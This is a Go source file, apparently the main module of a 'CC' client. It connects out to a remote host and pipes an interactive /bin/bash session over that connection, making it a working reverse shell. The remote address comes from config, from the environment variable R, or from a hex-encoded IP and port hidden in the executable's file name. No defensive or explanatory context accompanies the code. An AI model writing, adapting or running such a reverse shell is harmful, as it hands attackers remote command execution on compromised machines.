package main

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"
	"sync"

	"github.com/paalgyula/cc/config"
	"github.com/paalgyula/cc/pkg/connection"
)

func resolveRemoteFromName(name string) (string, error) {
	if strings.Contains(name, "-") {
		fragments := strings.Split(name, "-")
		addr := fragments[len(fragments)-1]

		if len(addr) != 12 {
			return "", errors.New("address must be 12 characters long")
		}

		ipbytes := make([]byte, 4)
		var port int

		r := bytes.NewBufferString(addr)

		// Simple parse for IP address from hex string
		_, err := fmt.Fscanf(r, "%02x%02x%02x%02x%04x",
			&ipbytes[0], &ipbytes[1], &ipbytes[2], &ipbytes[3], &port)

		if err != nil {
			return "", fmt.Errorf("resolveRemoteFromName: %w", err)
		}

		// Normalize IPv4 address
		return fmt.Sprintf("%d.%d.%d.%d:%d",
			ipbytes[0],
			ipbytes[1],
			ipbytes[2],
			ipbytes[3],
			port,
		), nil
	}

	return "", errors.New("WTF")
}

func findShell() string {
	// TODO: find shell executable
	return "/bin/bash"
}

func createShell(conn io.ReadWriter) {
	subProcess := exec.Command(findShell())

	in, err := subProcess.StdinPipe()
	if err != nil {
		config.Info("stdin pipe error: %v", err)
	}

	processOut, err := subProcess.StdoutPipe()
	if err != nil {
		config.Info("%v", err)
	}

	var wg sync.WaitGroup
	wg.Add(2)

	// Process output stream
	go func() {
		defer wg.Done()
		io.Copy(conn, processOut)
		processOut.Close()
	}()

	// Process input stream
	go func() {
		defer wg.Done()
		defer in.Close()

		r := make([]byte, 1)
		for {
			_, err := conn.Read(r)

			fmt.Print(string(r))

			if err != nil {
				if err != io.EOF {
					config.Info("read error: %v", err)
				}

				break
			}

			_, _ = in.Write(r)
		}
	}()

	config.Info("streams opened, bridging!")

	subProcess.Run()

	wg.Wait()
	fmt.Println("process ended")

	os.Exit(1)
}

func main() {
	config.Info("Starting CC")

	if config.Remote == "" {
		config.Remote = os.Getenv("R")

		if config.Remote == "" {
			resolveRemoteFromName(os.Args[0])
		}
	}

	if config.Remote == "" {
		config.Info("R is not configured\n")
		return
	}

	config.Info("R is set to: %s", config.Remote)

	conn, err := connection.Connect(config.Remote)
	if err != nil {
		config.Info("error: %v\n", err)
		os.Exit(1)
	}

	defer conn.Close()
	createShell(conn)
}
